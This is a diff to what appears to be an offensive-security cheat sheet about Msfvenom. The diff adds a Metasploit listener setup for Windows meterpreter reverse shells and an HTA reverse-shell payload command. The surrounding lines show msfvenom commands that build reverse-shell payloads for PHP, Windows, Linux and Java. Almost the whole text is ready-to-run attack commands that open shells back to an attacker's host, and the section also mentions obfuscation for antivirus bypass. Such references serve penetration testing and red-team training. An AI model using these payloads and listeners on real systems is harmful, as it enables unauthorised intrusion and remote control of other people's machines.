@@ -100,6 +100,18 @@ Resource Development
 
 	Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.
 	
+	**Set Up Listener**
+	
+	```
+	use exploit/multi/handler 
+	set PAYLOAD windows/meterpreter/reverse_tcp 
+	set LHOST your-ip 
+	set LPORT listening-port 
+	run
+	```
+	
+	**msfvenmo commands**
+	
 	**PHP:** `msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R`
 	
 	**Windows:** `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`
@@ -107,6 +119,8 @@ Resource Development
 	**Linux:** `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`
 	
 	**Java:** `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`
+	
+	**HTA:** `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta`
 	
 	![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)
 
